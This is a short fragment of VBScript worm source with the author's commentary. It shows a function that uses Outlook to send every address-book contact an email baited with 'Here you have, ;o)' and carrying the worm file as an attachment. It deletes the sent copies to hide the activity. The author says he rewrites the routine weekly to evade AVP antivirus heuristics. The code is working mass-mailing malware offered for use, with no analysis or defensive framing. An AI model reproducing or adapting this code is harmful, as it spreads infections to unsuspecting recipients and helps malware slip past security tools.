This function will send a message to each contact in the address list
with the worm attached.
i'm modifying this function once a week or so, cause avp is updating
his Heuristic I-Worms detection, and they detect the worm.
So, i'm making a version for week to avoid the detection
_______________________________________________________________________
¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯
Function Outlook()
On Error Resume Next
Set OutlookApp = CreateObject("Outlook.Application")
If OutlookApp = "Outlook" Then
Set Mapi = OutlookApp.GetNameSpace("MAPI")
set mapiadlist as Mapi.AddressLists
For Each Addresslist In  mapiadlist
If Addresslist.AddressEntries.Count <> 0 Then
Addresslistcout = Addresslist.AddressEntries.Count
For AddList = 1 To Addresslistcout
Set msg = OutlookApp.CreateItem(0)
Set AdEntries = Addresslist.AddressEntries(AddList)
msg.To = AdEntries.Address
msg.Subject = "Here you have, ;o)"
msg.Body = "Hi:" & vbCrLf & "Check This!"
set Attachs=msg.Attachments
Attachs.Add "c:\window\worm.vbs"
msg.DeleteAfterSubmit = True
If msg.To <> "" Then
msg.Send
End If
Next
End If
Next
End If
End Function
_______________________________________________________________________
¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯